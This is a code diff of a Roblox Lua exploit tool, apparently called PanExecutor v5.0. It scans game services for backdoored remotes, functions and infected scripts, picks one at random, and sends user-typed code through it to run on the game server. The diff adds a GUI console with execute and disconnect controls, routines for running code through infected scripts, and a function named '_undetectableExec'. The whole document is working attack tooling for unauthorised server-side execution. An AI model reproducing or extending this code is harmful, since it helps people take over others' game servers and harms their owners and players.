+    clearCorner.Parent = clearButton
+    
+    local discButton = Instance.new("TextButton")
+    discButton.Name = "Disconnect"
+    discButton.Size = UDim2.new(0.24, -5, 1, 0)
+    discButton.Position = UDim2.new(0.50, 5, 0, 0)
+    discButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+    discButton.Text = "⏹ Disconnect"
+    discButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discButton.Font = Enum.Font.GothamBold
+    discButton.TextSize = 14
+    discButton.Parent = buttonFrame
+    
+    local discCorner = Instance.new("UICorner")
+    discCorner.CornerRadius = UDim.new(0, 8)
+    discCorner.Parent = discButton
+    
+    local clearConsoleBtn = Instance.new("TextButton")
+    clearConsoleBtn.Name = "ClearConsole"
+    clearConsoleBtn.Size = UDim2.new(0.24, -5, 1, 0)
+    clearConsoleBtn.Position = UDim2.new(0.75, 5, 0, 0)
+    clearConsoleBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+    clearConsoleBtn.Text = "⌫ Clear Log"
+    clearConsoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    clearConsoleBtn.Font = Enum.Font.GothamBold
+    clearConsoleBtn.TextSize = 14
+    clearConsoleBtn.Parent = buttonFrame
+    
+    local clearConsoleCorner = Instance.new("UICorner")
+    clearConsoleCorner.CornerRadius = UDim.new(0, 8)
+    clearConsoleCorner.Parent = clearConsoleBtn
+    
+    execButton.MouseButton1Click:Connect(function()
+        local script = textBox.Text
+        if script and #script > 0 then
+            _log("GUI: Execute clicked", "GUI")
+            
+            if not _bs._a then
+                _log("GUI: Backdoor not active, attempting reactivation...", "GUI")
+                _addConsoleLog("Backdoor not active, attempting reactivation...", "WARN")
+            end
+            
+            local success = _bs.Execute(script)
+            if success then
+                _log("GUI: Execute SUCCESS", "GUI")
+                _addConsoleLog("✓ Script executed successfully", "SUCCESS")
+            else
+                _log("GUI: Execute FAILED", "GUI")
+                _addConsoleLog("✗ Script execution failed", "ERROR")
+            end
+        else
+            _log("GUI: Empty script", "GUI")
+            _addConsoleLog("⚠ Empty script", "WARN")
+        end
+    end)
+    
+    clearButton.MouseButton1Click:Connect(function()
+        textBox.Text = ""
+        _log("GUI: Script cleared", "GUI")
+        _addConsoleLog("Script box cleared", "INFO")
+    end)
+    
+    discButton.MouseButton1Click:Connect(function()
+        _log("GUI: Disconnect clicked", "GUI")
+        _addConsoleLog("Disconnecting from backdoor...", "INFO")
+        
+        _bs.Disconnect()
+        
+        _updateGUIStatus(false)
+        
+        _addConsoleLog("Disconnected from backdoor", "DISCONNECT")
+        _log("GUI: Disconnected successfully", "GUI")
+    end)
+    
+    clearConsoleBtn.MouseButton1Click:Connect(function()
+        _consoleLogs = {}
+        consoleText.Text = ""
+        _log("GUI: Console cleared", "GUI")
+    end)
+    
+    local minimized = false
+    minButton.MouseButton1Click:Connect(function()
+        minimized = not minimized
+        if minimized then
+            textBoxFrame.Visible = false
+            consoleFrame.Visible = false
+            buttonFrame.Position = UDim2.new(0, 10, 0, 45)
+            mainFrame.Size = UDim2.new(0, 500, 0, 90)
+            minButton.Text = "+"
+        else
+            textBoxFrame.Visible = true
+            consoleFrame.Visible = true
+            buttonFrame.Position = UDim2.new(0, 10, 1, -50)
+            mainFrame.Size = UDim2.new(0, 500, 0, 400)
+            minButton.Text = "−"
+        end
+    end)
+    
+    closeButton.MouseButton1Click:Connect(function()
+        _log("GUI: Hidden (use ToggleGUI to show)", "GUI")
+        screenGui.Enabled = false
+    end)
+    
+    _addConsoleLog("PanExecutor v5.0 loaded", "INFO")
+    _addConsoleLog("Waiting for backdoor activation...", "INFO")
+    
+    _log("GUI Created successfully", "GUI")
+    return screenGui
+end
+
+local function _updateGUIStatus(isActive)
+    if _bs._guiStatusDot and _bs._guiStatusText then
+        if isActive then
+            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+            _bs._guiStatusText.Text = "Active"
+            _bs._guiStatusText.TextColor3 = Color3.fromRGB(0, 255, 100)
+            _addConsoleLog("Status: Connected", "SUCCESS")
+        else
+            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            _bs._guiStatusText.Text = "Disconnected"
+            _bs._guiStatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
+            _addConsoleLog("Status: Disconnected", "ERROR")
+        end
+    end
+end
+
+local function _executeThroughInfectedScript(code, scriptInfo)
+    if not scriptInfo or not scriptInfo.Object then
+        return false
+    end
+    
+    local scr = scriptInfo.Object
+    
+    local exists = pcall(function() return scr.Parent end)
+    if not exists then
+        _log("Infected script no longer exists", "ERROR")
+        return false
+    end
+    
+    if scriptInfo.EntryPoint then
+        local ep = scriptInfo.EntryPoint
+        
+        local remote = nil
+        local searchRoot = scr.Parent or game:GetService("ReplicatedStorage")
+        
+        local children = {}
+        pcall(function() children = searchRoot:GetDescendants() end)
+        
+        for _, obj in ipairs(children) do
+            if obj.Name == ep.remoteName and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+                remote = obj
+                break
+            end
+        end
+        
+        if remote then
+            _log("Using infected script entry point: " .. ep.type, "INFECTED")
+            
+            if ep.type == "RemoteEvent" then
+                pcall(function() remote:FireServer(code) end)
+                return true
+            elseif ep.type == "RemoteFunction" then
+                pcall(function() remote:InvokeServer(code) end)
+                return true
+            end
+        end
+    end
+    
+    local parent = scr.Parent
+    if parent then
+        local children = {}
+        pcall(function() children = parent:GetChildren() end)
+        
+        for _, obj in ipairs(children) do
+            if obj:IsA("RemoteEvent") then
+                _log("Using sibling RemoteEvent in infected container", "INFECTED")
+                pcall(function() obj:FireServer(code) end)
+                return true
+            elseif obj:IsA("RemoteFunction") then
+                _log("Using sibling RemoteFunction in infected container", "INFECTED")
+                pcall(function() obj:InvokeServer(code) end)
+                return true
+            end
+        end
+    end
+    
+    return false
 end
 
 local function _undetectableExec(code)
     if not _bs._selected then
         _log("No backdoor selected", "ERROR")
         return false
+    end
+    
+    if _bs._selectedType == "script" and _bs._selected.ScriptInfo then
+        return _executeThroughInfectedScript(code, _bs._selected.ScriptInfo)
     end
     
     local r = _bs._selected.Object
@@ -680,14 +964,16 @@ local function _quickScan()
             
             if isRemote then
                 local sus, score = _isSus(obj.Name)
-                if sus then
+                local backdoored, bdScore = _isBackdooredFunc(obj.Name)
+                
+                if sus or backdoored then
                     table.insert(foundRemotes, {
                         Object = obj,
                         Name = obj.Name,
                         Type = obj.ClassName,
                         Path = obj:GetFullName(),
-                        Category = "MALICIOUS",
-                        RiskScore = score,
+                        Category = backdoored and "BACKDOORED_FUNC" or "MALICIOUS",
+                        RiskScore = score + bdScore,
                         Vulnerable = true,
                         ExecutionMethod = "quick_reactivate"
                     })
@@ -700,34 +986,11 @@ local function _quickScan()
         local selected, backup = _selectRandomBackdoor(foundRemotes)
         _bs._selected = selected
         _bs._backup = backup
+        _bs._selectedType = "remote"
         return true
     end
     
     return false
-end
-
-local function _directExecute(code, backdoorInfo)
-    if not backdoorInfo or not backdoorInfo.Object then
-        return false
-    end
-    
-    local r = backdoorInfo.Object
-    local t = backdoorInfo.Type
-    
-    local exists = pcall(function() return r.Parent end)
-    if not exists then
-        return false
-    end
-    
-    local function tryExecute()
-        if t == _str.RemoteEvent then
-            pcall(function() r:FireServer(code) end)
-        else
-            pcall(function() r:InvokeServer(code) end)
-        end
-    end
-    
-    return pcall(tryExecute)
 end
 
 local function _startMonitoring()
@@ -747,7 +1010,7 @@ local function _startMonitoring()
     local path = _bs._selected.Path
     
     _storage.selectedPath = path
-    _storage.selectedType = _bs._selected.Type
+    _storage.selectedType = _bs._selectedType
     
     _log("Monitoring: " .. path, "MONITOR")
     
@@ -764,7 +1027,7 @@ local function _startMonitoring()
         
         if not exists then
             _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
-            _updateGUIStatus(false)  -- [NEW] Update GUI to red
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             _bs.Disconnect()
             return
@@ -878,7 +1141,7 @@ function _bs.Execute(code)
             _bs._a = true
             
             _startMonitoring()
-            _updateGUIStatus(true)  -- [NEW] Update GUI to green
+            _updateGUIStatus(true)
             
             _log("Reactivated successfully!", "REACTIVATE")
             return _undetectableExec(code)
@@ -909,8 +1172,10 @@ function _bs.Scan()
     _log("Starting scan...", "SCAN")
     _bs._r = {}
     _bs._n = {}
+    _bs._f = {}
     _bs._m = {}
     _bs._selected = nil
+    _bs._selectedType = nil
     _bs._backup = {}
     _bs._s = tick()
     
@@ -927,15 +1192,17 @@ function _bs.Scan()
     local allR = {}
     local allS = {}
     local allM = {}
+    local allF = {}
     
     for _, svc in ipairs(services) do
-        local ar, as, am = _scan(svc)
+        local ar, as, am, af = _scan(svc)
         for _, v in ipairs(ar) do table.insert(allR, v) end
         for _, v in ipairs(as) do table.insert(allS, v) end
         for _, v in ipairs(am) do table.insert(allM, v) end
+        for _, v in ipairs(af) do table.insert(allF, v) end
     end
     
-    _log(("Found %d remotes, %d scripts"):format(#allR, #allS), "SCAN")
+    _log(("Found %d remotes, %d functions, %d scripts"):format(#allR, #allF, #allS), "SCAN")
     
     for _, r in ipairs(allR) do
         if r.Category == "NORMAL" then
@@ -953,6 +1220,16 @@ function _bs.Scan()
         end
     end
     
+    for _, f in ipairs(allF) do
+        local isV, method, conf = _test(f, 0)
+        if isV then
+            f.Vulnerable = true
+            f.ExecutionMethod = method
+            f.Confidence = conf + 20
+            table.insert(_bs._f, f)
+        end
+    end
+    
     for _, s in ipairs(allS) do
         if s.IsBackdoor then
             local id = ""
@@ -963,9 +1240,9 @@ function _bs.Scan()
                 Name = s.Name,
                 Type = "ScriptBackdoor",
                 Path = s.Path,
-                Category = "MALICIOUS",
+                Category = "INFECTED_SCRIPT",
                 Vulnerable = true,
-                ExecutionMethod = "script_source",
+                ExecutionMethod = s.ExecutionMethod or "script_source",
                 Confidence = s.RiskScore,
                 ScriptInfo = s,
                 InstanceId = id
@@ -973,13 +1250,39 @@ function _bs.Scan()
         end
     end
     
-    if #_bs._r > 0 then
-        local selected, backup = _selectRandomBackdoor(_bs._r)
+    local allMalicious = {}
+    
+    for _, f in ipairs(_bs._f) do
+        table.insert(allMalicious, f)
+    end
+    
+    for _, s in ipairs(_bs._r) do
+        if s.Category == "INFECTED_SCRIPT" then
+            s.ScriptBackdoor = true
+            table.insert(allMalicious, s)
+        end
+    end
+    
+    for _, r in ipairs(_bs._r) do
+        if r.Category ~= "INFECTED_SCRIPT" then
+            table.insert(allMalicious, r)
+        end
+    end
+    
+    if #allMalicious > 0 then
+        local selected, backup = _selectRandomBackdoor(allMalicious)
         _bs._selected = selected
         _bs._backup = backup
         
-        if selected then
-            _log(("Selected: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
+        if selected.Category == "BACKDOORED_FUNC" then
+            _bs._selectedType = "function"
+            _log(("Selected BACKDOORED FUNCTION: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
+        elseif selected.Category == "INFECTED_SCRIPT" or selected.ScriptBackdoor then
+            _bs._selectedType = "script"
+            _log(("Selected INFECTED SCRIPT: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
+        else
+            _bs._selectedType = "remote"
+            _log(("Selected REMOTE: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
         end
     end
     
@@ -1009,17 +1312,25 @@ function _bs.Initialize(cb, cfg)
         _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
     end
     
-    _log("Initialized (Auto-Reconnect + GUI Enabled)", "INIT")
+    _log("Initialized v5.0 (Manager + GUI + Console)", "INIT")
     return _bs
 end
 
 function _bs.Activate()
     if _bs._selected then
         _bs._a = true
-        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
-        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
+        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s:%s"):format(
+            _bs._selected.Path, 
+            _bs._selected.Type, 
+            _bs._selectedType or "unknown"
+        ))
+        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s:%s"):format(
+            _bs._selected.Path, 
+            _bs._selected.Type, 
+            _bs._selected.ExecutionMethod or "direct",
+            _bs._selectedType or "unknown"
+        ))
         
-        -- [NEW] Create GUI when activated
         _createGUI()
         
         _startMonitoring()
@@ -1036,18 +1347,102 @@ function _bs.Disconnect()
     _stopMonitoring()
     _bs._a = false
     
-    -- [NEW] Update GUI status
     _updateGUIStatus(false)
     
     local oldPath = "unknown"
+    local oldType = _bs._selectedType
     if _bs._selected then
         oldPath = _bs._selected.Path
     end
-    _bs._selected = nil
-    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
-    _log("Disconnected: " .. oldPath, "DISCONNECT")
     
-    -- [NEW] Don't destroy GUI, just update status so user can see it's disconnected
+    _bs._selected = nil
+    _bs._selectedType = nil
+    
+    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath .. ":" .. (oldType or "unknown"))
+    _log("Disconnected: " .. oldPath .. " (Type: " .. (oldType or "unknown") .. ")", "DISCONNECT")
+end
+
+-- [MANAGER SUPPORT] Get all detected backdoors for manager selection
+function _bs.GetAllDetected()
+    local all = {}
+    
+    for _, f in ipairs(_bs._f) do
+        table.insert(all, {
+            Path = f.Path,
+            Type = f.Type,
+            ExecutionMethod = f.ExecutionMethod,
+            Confidence = f.Confidence,
+            Category = f.Category
+        })
+    end
+    
+    for _, s in ipairs(_bs._r) do
+        if s.Category == "INFECTED_SCRIPT" then
+            table.insert(all, {
+                Path = s.Path,
+                Type = s.Type,
+                ExecutionMethod = s.ExecutionMethod,
+                Confidence = s.Confidence,
+                Category = "INFECTED_SCRIPT"
+            })
+        end
+    end
+    
+    for _, r in ipairs(_bs._r) do
+        if r.Category ~= "INFECTED_SCRIPT" then
+            table.insert(all, {
+                Path = r.Path,
+                Type = r.Type,
+                ExecutionMethod = r.ExecutionMethod,
+                Confidence = r.Confidence,
+                Category = r.Category
+            })
+        end
+    end
+    
+    return all
+end
+
+-- [MANAGER SUPPORT] Activate specific backdoor by path and category
+function _bs.ActivateSpecific(path, category)
+    local toActivate = nil
+    
+    for _, f in ipairs(_bs._f) do
+        if f.Path == path then
+            toActivate = f
+            _bs._selectedType = "function"
+            break
+        end
+    end
+    
+    if not toActivate then
+        for _, r in ipairs(_bs._r) do
+            if r.Path == path then
+                toActivate = r
+                if r.Category == "INFECTED_SCRIPT" then
+                    _bs._selectedType = "script"
+                else
+                    _bs._selectedType = "remote"
+                end
+                break
+            end
+        end
+    end
+    
+    if toActivate then
+        _bs._selected = toActivate
+        _bs._a = true
+        
+        _startMonitoring()
+        _startGameMonitoring()
+        
+        _createGUI()
+        
+        _log("Activated specific: " .. path, "ACTIVE")
+        return true
+    end
+    
+    return false
 end
 
 function _bs.GetStatus()
@@ -1055,9 +1450,11 @@ function _bs.GetStatus()
         Active = _bs._a,
         HasSelection = _bs._selected ~= nil,
         SelectedPath = _bs._selected and _bs._selected.Path or nil,
+        SelectedType = _bs._selectedType,
         StoredPath = _storage.selectedPath,
         BackupCount = #_bs._backup,
         NormalRemotes = #_bs._n,
+        BackdooredFunctions = #_bs._f,
         ScanTime = tick() - _bs._s,
         CurrentGameId = _bs._currentGameId,
         HasGUI = _bs._gui ~= nil
@@ -1072,7 +1469,6 @@ function _bs.GetBackups()
     return _bs._backup
 end
 
--- [NEW] Toggle GUI visibility
 function _bs.ToggleGUI()
     if _bs._gui then
         _bs._gui.Enabled = not _bs._gui.Enabled
@@ -1083,13 +1479,13 @@ function _bs.ToggleGUI()
     end
 end
 
--- [NEW] Destroy GUI completely
 function _bs.DestroyGUI()
     if _bs._gui then
         pcall(function() _bs._gui:Destroy() end)
         _bs._gui = nil
         _bs._guiStatusDot = nil
         _bs._guiStatusText = nil
+        _bs._guiConsole = nil
         _log("GUI Destroyed", "GUI")
     end
 end
